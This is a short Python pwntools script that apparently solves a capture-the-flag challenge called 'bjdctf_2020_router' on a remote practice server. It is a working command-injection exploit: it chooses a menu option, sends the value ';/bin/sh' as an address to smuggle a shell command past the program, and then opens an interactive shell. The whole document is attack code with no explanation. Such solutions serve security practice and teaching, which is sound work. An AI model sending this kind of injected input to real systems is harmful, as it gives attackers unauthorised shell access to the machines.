from pwn import *

#p = process('./bjdctf_2020_router')
p = remote('node4.buuoj.cn', 27154)

p.sendlineafter('choose:\n', '1')
p.sendlineafter('address:\n', ';/bin/sh')

p.interactive()
